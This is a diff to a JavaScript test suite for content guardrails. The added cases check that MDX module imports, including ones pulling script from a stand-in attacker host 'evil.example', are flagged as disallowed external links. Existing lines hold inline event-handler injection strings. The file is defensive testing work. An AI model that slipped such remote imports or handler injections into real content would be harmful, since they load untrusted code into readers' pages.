@@ -2432,6 +2432,20 @@ describe('third-party price citations + citation-grade TLDs (owner ruling 2026-0
     for (const body of ['<p onclick="fetch(1)">x</p>', '<img src="/images/a.webp" onerror="x()">', '<div onload="x()">y</div>']) {
       expect(guardrails._internals.externalLinkFinding(body, OPC)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
     }
+    // MDX ESM is module code that no tag or expression scan sees.
+    for (const body of [
+      'import x from "https://evil.example/p.js";\n\nprose',
+      'export const x = 1;\n\nprose',
+      'import{x}from"https://evil.example/p.js"\n\nprose',
+      '   import * as x from "y"\n\nprose',
+      '> import x from "y"\n\nprose',
+    ]) {
+      expect(guardrails._internals.externalLinkFinding(body, OPC)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
+    }
+    // Prose words that merely start with the keyword are unaffected.
+    for (const body of ['It is important to note the fee.', 'The company exports data.']) {
+      expect(guardrails._internals.externalLinkFinding(body, OPC)).toBeNull();
+    }
     // Passive formatting and MDX components are unaffected.
     for (const body of ['<p>Orkin charges a fee.</p>', '<table><tr><td>x</td></tr></table>', '<ComparisonTable columns={["a"]} />']) {
       expect(guardrails._internals.externalLinkFinding(body, OPC)).toBeNull();
